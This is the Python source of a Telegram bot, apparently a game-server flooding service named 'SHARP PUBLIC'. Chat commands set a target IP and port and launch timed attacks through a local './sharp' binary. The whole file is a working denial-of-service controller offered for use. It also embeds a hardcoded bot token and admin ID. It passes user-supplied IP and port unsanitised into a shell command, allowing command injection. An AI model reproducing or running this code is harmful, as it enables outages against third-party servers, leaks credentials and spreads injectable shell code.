import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7225546868:AAGgGmHBKk_5kSoCO4-Z0aRpv6EZTrBVNjc'
ADMIN_USER_ID = 5817935431
USERS_FILE = 'users.txt'
attack_in_progress = False
attack_paused = False
current_process = None
default_ip = None  # Store the default IP
default_port = None  # Store the default port
DEFAULT_DURATION = 400  # Default attack duration of 400 seconds

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the SHARP PUBLIC🔥*\n\n"
        "*Commands:*\n"
        "- /set <ip> <port>: Set default IP and port\n"
        "- /attack: Launch attack with default time (400s)\n"
        "- /pause, /resume, /stop: Control attack\n"
        "- /10, /20, /30, /300, /600: Set specific durations\n"
        "*Let Start Fucking ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def sharp(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /sharp <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')

async def set_ip_port(update: Update, context: CallbackContext):
    global default_ip, default_port
    chat_id = update.effective_chat.id
    args = context.args

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /set <ip> <port>*", parse_mode='Markdown')
        return

    default_ip, default_port = args
    await context.bot.send_message(chat_id=chat_id, text=f"*✔️ Default IP and Port set to {default_ip}:{default_port}*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, current_process, attack_paused

    attack_in_progress = True
    attack_paused = False

    try:
        process = await asyncio.create_subprocess_shell(
            f"./sharp {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        current_process = process

        while True:
            if attack_paused:
                await asyncio.sleep(1)  # Paused state, do nothing
                continue
            stdout = await process.stdout.read(1024)
            if not stdout and process.returncode is not None:
                break

            print(f"[stdout] {stdout.decode()}")
            await asyncio.sleep(1)

        stderr = await process.stderr.read()
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using SHARP PUBLIC!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_paused, default_ip, default_port

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if not default_ip or not default_port:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No default IP or Port set. Use /set <ip> <port> first.*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {default_ip}:{default_port}*\n"
        f"*🕒 Duration: {DEFAULT_DURATION} seconds*\n"
        f"*🔥 Enjoy and Fuck Whole Lobby 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, default_ip, default_port, DEFAULT_DURATION, context))

async def pause(update: Update, context: CallbackContext):
    global attack_paused, attack_in_progress
    chat_id = update.effective_chat.id

    if not attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No attack in progress to pause.*", parse_mode='Markdown')
        return

    attack_paused = True
    await context.bot.send_message(chat_id=chat_id, text="*⏸️ Attack paused!*", parse_mode='Markdown')

async def resume(update: Update, context: CallbackContext):
    global attack_paused, attack_in_progress
    chat_id = update.effective_chat.id

    if not attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No attack in progress to resume.*", parse_mode='Markdown')
        return

    if not attack_paused:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack is not paused.*", parse_mode='Markdown')
        return

    attack_paused = False
    await context.bot.send_message(chat_id=chat_id, text="*▶️ Attack resumed!*", parse_mode='Markdown')

async def stop(update: Update, context: CallbackContext):
    global attack_in_progress, current_process
    chat_id = update.effective_chat.id

    if not attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No attack in progress to stop.*", parse_mode='Markdown')
        return

    if current_process:
        current_process.terminate()  # Stop the process
        current_process = None

    attack_in_progress = False
    await context.bot.send_message(chat_id=chat_id, text="*⏹️ Attack stopped!*", parse_mode='Markdown')

async def attack_with_custom_duration(update: Update, context: CallbackContext, duration):
    global default_ip, default_port

    chat_id = update.effective_chat.id

    if not default_ip or not default_port:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No default IP or Port set. Use /set <ip> <port> first.*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {default_ip}:{default_port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Enjoy and Fuck Whole Lobby 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, default_ip, default_port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("sharp", sharp))
    application.add_handler(CommandHandler("set", set_ip_port))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("pause", pause))
    application.add_handler(CommandHandler("resume", resume))
    application.add_handler(CommandHandler("stop", stop))

    # Custom time handlers
    application.add_handler(CommandHandler("10", lambda u, c: asyncio.create_task(attack_with_custom_duration(u, c, 10))))
    application.add_handler(CommandHandler("20", lambda u, c: asyncio.create_task(attack_with_custom_duration(u, c, 20))))
    application.add_handler(CommandHandler("30", lambda u, c: asyncio.create_task(attack_with_custom_duration(u, c, 30))))
    application.add_handler(CommandHandler("300", lambda u, c: asyncio.create_task(attack_with_custom_duration(u, c, 300))))
    application.add_handler(CommandHandler("600", lambda u, c: asyncio.create_task(attack_with_custom_duration(u, c, 600))))

    application.run_polling()

if __name__ == '__main__':
    main()
    
